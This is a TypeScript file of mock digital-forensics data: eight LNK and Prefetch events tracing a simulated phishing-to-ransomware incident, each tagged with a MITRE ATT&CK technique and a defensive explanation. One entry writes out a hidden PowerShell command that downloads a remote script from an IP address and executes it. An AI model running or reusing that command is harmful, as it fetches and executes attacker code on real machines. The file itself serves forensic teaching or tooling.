export interface ForensicEvent {
    id: string;
    timestamp: string; // "YYYY-MM-DD HH:MM:SS"
    artifactType: 'LNK (Shortcut)' | 'Prefetch (.pf)';
    extractedField: string;
    value: string;
    riskLevel: 'Critical' | 'High' | 'Medium' | 'Low';
    mitreTactic: string;
    forensicSignificance: string;
  }
  
  export const mockForensicData: ForensicEvent[] = [
    {
      id: "EVT-001",
      timestamp: "2026-07-25 08:15:12",
      artifactType: "LNK (Shortcut)",
      extractedField: "Target Path",
      value: "C:\\Users\\vpatel\\AppData\\Local\\Temp\\~Invoice_Q3.lnk",
      riskLevel: "High",
      mitreTactic: "T1204.002 - User Execution: Malicious File",
      forensicSignificance: "Initial phishing attachment LNK created in Temp; indicates user opened a malicious email attachment."
    },
    {
      id: "EVT-002",
      timestamp: "2026-07-25 08:15:18",
      artifactType: "LNK (Shortcut)",
      extractedField: "Command Line Arguments",
      value: "powershell.exe -NoP -NonI -W Hidden -C \"IEX(New-Object Net.WebClient).DownloadString('http://185.212.47.39/stage1.ps1')\"",
      riskLevel: "Critical",
      mitreTactic: "T1059.001 - PowerShell",
      forensicSignificance: "LNK invokes hidden PowerShell to download remote script; classic initial payload delivery pattern."
    },
    {
      id: "EVT-003",
      timestamp: "2026-07-25 08:16:41",
      artifactType: "Prefetch (.pf)",
      extractedField: "Executable Name",
      value: "POWERSHELL.EXE-7A3C1F9E.pf",
      riskLevel: "High",
      mitreTactic: "T1059.001 - PowerShell",
      forensicSignificance: "Prefetch confirms PowerShell execution shortly after LNK activation; correlates with command-line download."
    },
    {
      id: "EVT-004",
      timestamp: "2026-07-25 08:17:55",
      artifactType: "LNK (Shortcut)",
      extractedField: "Target Path",
      value: "C:\\Users\\vpatel\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update_helper.lnk",
      riskLevel: "High",
      mitreTactic: "T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
      forensicSignificance: "Secondary LNK placed in Startup folder to ensure persistence after reboot."
    },
    {
      id: "EVT-005",
      timestamp: "2026-07-25 08:18:32",
      artifactType: "Prefetch (.pf)",
      extractedField: "Run Count",
      value: "1",
      riskLevel: "Medium",
      mitreTactic: "T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
      forensicSignificance: "Prefetch shows single execution of startup helper; indicates newly created persistence mechanism."
    },
    {
      id: "EVT-006",
      timestamp: "2026-07-25 08:20:07",
      artifactType: "LNK (Shortcut)",
      extractedField: "Target Path",
      value: "C:\\Users\\vpatel\\AppData\\Local\\Microsoft\\OneDrive\\cache\\svchost_updater.exe",
      riskLevel: "Critical",
      mitreTactic: "T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
      forensicSignificance: "LNK points to hidden ransomware executable masquerading as OneDrive cache file."
    },
    {
      id: "EVT-007",
      timestamp: "2026-07-25 08:21:44",
      artifactType: "Prefetch (.pf)",
      extractedField: "Executable Name",
      value: "SVCHOST_UPDATER.EXE-9F2B8C11.pf",
      riskLevel: "Critical",
      mitreTactic: "T1486 - Data Encrypted for Impact (Ransomware)",
      forensicSignificance: "Prefetch confirms execution of suspicious executable in AppData; strong indicator of ransomware payload."
    },
    {
      id: "EVT-008",
      timestamp: "2026-07-25 08:23:59",
      artifactType: "Prefetch (.pf)",
      extractedField: "File Access Trace",
      value: "C:\\Users\\vpatel\\Documents\\*.docx; C:\\Users\\vpatel\\Desktop\\*.xlsx",
      riskLevel: "Critical",
      mitreTactic: "T1486 - Data Encrypted for Impact (Ransomware)",
      forensicSignificance: "Prefetch file access traces show rapid enumeration of Office documents consistent with ransomware encryption behavior."
    }
  ];